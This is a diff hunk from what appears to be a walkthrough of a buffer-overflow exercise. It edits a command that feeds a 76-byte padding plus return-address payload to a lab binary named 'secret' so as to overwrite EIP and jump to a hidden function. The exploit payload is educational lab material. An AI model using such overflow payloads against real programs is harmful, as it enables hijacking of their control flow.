@@ -121,7 +121,7 @@ We will now create the payload using `sys.stdout.buffer.write()` instead of `pri
 Next, we'll execute the binary with our crafted payload using the command:
 
 ```bash
-./secret $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*76 + b"\x9d\x61\x55\x56")')
+./secret <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*76 + b"\x9d\x61\x55\x56")')
 ```
 
 This command runs the `secret` binary while injecting the payload directly, aiming to overwrite the EIP with the address of the `secret` function.
